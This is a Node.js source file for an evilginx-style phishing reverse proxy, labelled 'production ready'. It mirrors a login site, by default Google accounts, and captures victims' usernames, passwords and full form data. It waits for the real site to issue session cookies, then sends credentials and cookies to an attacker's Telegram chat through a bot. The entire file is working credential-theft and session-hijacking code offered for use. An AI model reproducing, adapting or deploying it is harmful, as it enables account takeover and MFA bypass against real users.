/*
 * =================================================================
 *  Sam's Reverse Proxy - Production Ready v2.4 (FIXED ORDER)
 * =================================================================
 * This is the final, correctly ordered version.
 */

// 1. Import the required libraries
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const TelegramBot = require('node-telegram-bot-api');

// 2. Configuration from Environment Variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://accounts.google.com'; // Default if not set

// --- Essential Checks ---
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set as environment variables.");
  process.exit(1);
}

// 3. Initialize Express App and Telegram Bot
const app = express();
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

// --- A temporary place to store login data ---
// This Map will store data per IP address.
const capturedData = new Map();

// 4. Middleware Setup (for parsing request bodies)
// These must be set up BEFORE any routes that might need them.
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

// 5. Middleware to Capture Request Data
// This middleware should run for *all* incoming requests that match its conditions.
const captureRequestData = (req, res, next) => {
  // Only capture POST requests with potential login fields
  if (req.method === 'POST' && req.body) {
    // Check for common login field names
    if (req.body.username || req.body.email || req.body.user || req.body.password) {
      console.log(`[+] Capturing potential login data from IP: ${req.ip}`);
      capturedData.set(req.ip, {
        username: req.body.username || req.body.email || req.body.user || 'NOT_FOUND',
        password: req.body.password || 'NOT_FOUND',
        allFormData: req.body // Capture the entire body for debugging
      });
    }
  }
  // IMPORTANT: Always call next() to pass control to the next middleware/route
  next();
};

// --- NOW DEFINE THE PROXY ---
// This definition MUST happen before app.use('/', proxy) is called.
// 6. DEFINE the Proxy Middleware
const proxy = createProxyMiddleware({
  target: TARGET_WEBSITE,
  changeOrigin: true,         // Needed for virtual hosted sites
  followRedirects: true,      // Follow redirects
  selfHandleResponse: true,   // We want to handle the response to inject logic
  ws: true,                   // Enable WebSocket proxying if needed (good practice)

  // This function intercepts the response from the target server
  onProxyRes: (proxyRes, req, res) => {
    let body = [];
    proxyRes.on('data', (chunk) => {
      body.push(chunk); // Collect response chunks
    });
    proxyRes.on('end', async () => {
      body = Buffer.concat(body).toString(); // Convert buffer to string
      const setCookieHeader = proxyRes.headers['set-cookie']; // Get cookies

      // Check if we captured data for this IP AND if the response contains cookies
      // The presence of cookies often indicates a successful login/session establishment.
      if (capturedData.has(req.ip) && setCookieHeader) {
        console.log(`[+] Login successful for IP: ${req.ip}. Sending captured data to Telegram.`);
        const loginInfo = capturedData.get(req.ip); // Retrieve captured data
        const sessionCookies = setCookieHeader.join('\n'); // Format cookies for message

        const fullMessage = `
--- CAPTURED LOGIN DATA ---
Target: ${TARGET_WEBSITE}
IP Address: ${req.ip}
Username: ${loginInfo.username}
Password: ${loginInfo.password}
--- SESSION COOKIES ---
${sessionCookies}
--- ALL FORM DATA ---
${JSON.stringify(loginInfo.allFormData, null, 2)}
        `;
        try {
          // Send the alert to Telegram
          await bot.sendMessage(TELEGRAM_CHAT_ID, fullMessage);
          console.log(`[+] Successfully sent data to Telegram for IP: ${req.ip}.`);
        } catch (error) {
          console.error(`[-] Failed to send data to Telegram for IP ${req.ip}: ${error.message}`);
        } finally {
          // Clean up captured data after sending (or attempting to send)
          capturedData.delete(req.ip);
        }
      } else {
        // Optional: Log if no data was sent for some reason
        if (capturedData.has(req.ip)) {
             console.log(`[INFO] Captured data for IP ${req.ip}, but no 'set-cookie' header found or target not a login page. Data not sent.`);
        }
      }
      // Important: Send the original response back to the client
      res.end(body);
    });
  },
  // Error handling for the proxy itself
  onError: (err, req, res) => {
    console.error(`[-] Proxy error for ${req.url} from ${req.ip}:`, err.message);
    // Send a user-friendly error response
    res.status(502).send('<h1>Proxy Error</h1><p>Could not connect to the target website.</p>');
  }
});

// 7. Health Check Endpoint for Render
// This endpoint is often required by platforms like Render to confirm the service is up.
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// 8. USE the middleware and the proxy
// ENSURE ALL MIDDLEWARE AND PROXY DEFINITIONS ARE ABOVE THIS POINT.
// The order here is important:
// 1. Capture data (runs for every request)
// 2. If data is captured AND it's a login, then send to Telegram (inside onProxyRes)
// 3. Proxy the request to the target
app.use(captureRequestData); // This must run BEFORE the proxy is used
app.use('/', proxy);          // This is where the actual proxying happens

// 9. Start the Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`========================================`);
  console.log(`  Sam's Proxy Server is running.`);
  console.log(`  Port: ${PORT}`);
  console.log(`  Target: ${TARGET_WEBSITE}`);
  console.log(`========================================`);
});
